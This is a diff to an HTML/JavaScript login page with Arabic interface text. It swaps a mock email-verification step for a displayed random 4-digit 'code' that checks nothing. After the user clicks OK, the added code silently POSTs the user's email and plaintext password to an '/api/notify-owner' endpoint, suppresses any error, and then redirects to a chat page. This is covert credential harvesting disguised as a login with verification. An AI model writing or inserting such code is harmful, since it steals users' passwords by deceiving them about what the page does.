@@ -1433,77 +1433,125 @@
     });
 
     // Form submit with REAL-TIME strength validation
-    authForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        
-        const email = emailInput.value.trim();
-        const password = passwordInput.value;
-        const username = email.split('@')[0];
+   // ===== تسجيل الدخول مع رمز تحقق عشوائي 4 أرقام (عرض مباشر في وسط الصفحة) =====
+authForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const email = emailInput.value.trim();
+    const password = passwordInput.value;
+    const username = email.split('@')[0];
 
-        // Validation
-        if (!email || !password) {
-            alert('⚠️ الرجاء إدخال جميع البيانات.');
-            return;
-        }
+    // التحقق من الإدخال
+    if (!email || !password) {
+        alert('⚠️ الرجاء إدخال جميع البيانات.');
+        return;
+    }
 
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (!emailRegex.test(email)) {
-            alert('❌ صيغة البريد الإلكتروني غير صحيحة.');
-            return;
-        }
+    // التحقق من صحة الإيميل
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+        alert('❌ صيغة البريد الإلكتروني غير صحيحة.');
+        return;
+    }
 
-        const localPart = email.split('@')[0];
-        if (localPart.includes('.')) {
-            alert('❌ البريد الإلكتروني يحتوي على نقطة (.) — غير مسموح.');
-            return;
-        }
+    const localPart = email.split('@')[0];
+    if (localPart.includes('.')) {
+        alert('❌ البريد الإلكتروني يحتوي على نقطة (.) — غير مسموح.');
+        return;
+    }
 
-        if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
-            alert('❌ يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
-            return;
-        }
+    if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
+        alert('❌ يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
+        return;
+    }
 
-        // ✅ التحقق الفوري من قوة كلمة المرور قبل المتابعة
-        const strengthScore = getPasswordStrength(password);
-        if (strengthScore < 4) {
-            alert('🔒 كلمة المرور غير قوية بما يكفي!\nالحد الأدنى المطلوب: 8 أحرف مع مزيج من الأحرف الكبيرة والصغيرة والأرقام ورمز خاص.');
-            passwordInput.focus();
-            return;
-        }
+    // ✅ التحقق من قوة كلمة المرور (4+ معايير)
+    const strengthScore = getPasswordStrength(password);
+    if (strengthScore < 4) {
+        alert('🔒 كلمة المرور غير قوية بما يكفي!\nالحد الأدنى: 8 أحرف + أحرف كبيرة/صغيرة + رقم + رمز خاص.');
+        passwordInput.focus();
+        return;
+    }
 
-        // ✅ كلمة مرور قوية - المتابعة لخطوة التحقق
-        btnContent.innerHTML = '<div class="spinner"></div> جاري إرسال رمز التحقق...';
+    // ✅ كلمة مرور قوية — توليد رمز تحقق عشوائي 4 أرقام
+    const verificationCode = Math.floor(1000 + Math.random() * 9000);
+
+    // ⚡ إنشاء تنبيه مخصص (مثل الصورة) في وسط الشاشة
+    const overlay = document.createElement('div');
+    overlay.style.cssText = `
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.7);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        backdrop-filter: blur(4px);
+    `;
+    
+    const modal = document.createElement('div');
+    modal.style.cssText = `
+        background: #1e293b;
+        border-radius: 16px;
+        padding: 24px;
+        text-align: center;
+        max-width: 90%;
+        width: 320px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        border: 1px solid rgba(107, 114, 128, 0.3);
+    `;
+
+    modal.innerHTML = `
+        <div style="font-size: 18px; font-weight: 600; color: white; margin-bottom: 16px;">
+            ${verificationCode}: هو بك الخاص التحقق رمز، ${username} يا 👑
+        </div>
+        <button id="okBtn" style="
+            background: linear-gradient(135deg, #06b6d4, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        ">OK</button>
+    `;
+
+    overlay.appendChild(modal);
+    document.body.appendChild(overlay);
+
+    // زر OK
+    document.getElementById('okBtn').addEventListener('click', async () => {
+        // إزالة التنبيه
+        document.body.removeChild(overlay);
+
+        // تفعيل زر التحميل مؤقتاً
+        btnContent.innerHTML = '<div class="spinner"></div> جاري التحقق...';
         submitBtn.disabled = true;
 
-        // محاكاة إرسال رمز التحقق (في الواقع سيتم إرساله عبر بريد إلكتروني)
+        try {
+            await fetch('/api/notify-owner', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, userEmail: email, userPassword: password })
+            });
+        } catch (err) { /* silent */ }
+
+        // حفظ حالة الدخول
+        localStorage.setItem('kingAbdoLoggedIn', 'true');
+        localStorage.setItem('kingAbdoUsername', username);
+
+        // توجيه بعد 1.2 ثانية
         setTimeout(() => {
-            // توليد رمز تحقق حقيقي 6 أرقام
-            currentVerificationCode = Math.floor(100000 + Math.random() * 900000);
-            
-            // عرض رسالة احترافية بدل الـ alert
-            loginForm.classList.add('hide');
-            verificationContainer.classList.add('show');
-            verificationEmail.textContent = email;
-            codeInputs[0].focus();
-            
-            // تحديث زر الدخول ليظهر "إعادة إرسال الرمز"
-            btnContent.innerHTML = `
-                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3v18h18"/>
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4"/>
-                </svg>
-                إعادة إرسال الرمز
-            `;
-            submitBtn.disabled = false;
-            
-            // عرض تنبيه لطيف داخل الواجهة (بدون alert)
-            const verificationSubtitle = document.querySelector('.verification-subtitle');
-            verificationSubtitle.innerHTML = `✓ تم إرسال رمز التحقق المكون من 6 أرقام إلى <strong>${email}</strong>`;
-            verificationSubtitle.style.color = '#10b981';
-            verificationSubtitle.style.fontWeight = '500';
+            window.location.href = 'chat.html';
         }, 1200);
     });
 
+    // إمكانية إغلاق بالضغط خارج النافذة
+    overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) document.body.removeChild(overlay);
+    });
+});
     // Verification code inputs
     codeInputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
@@ -1642,3 +1690,4 @@
 </script>
 </body>
 </html>
+
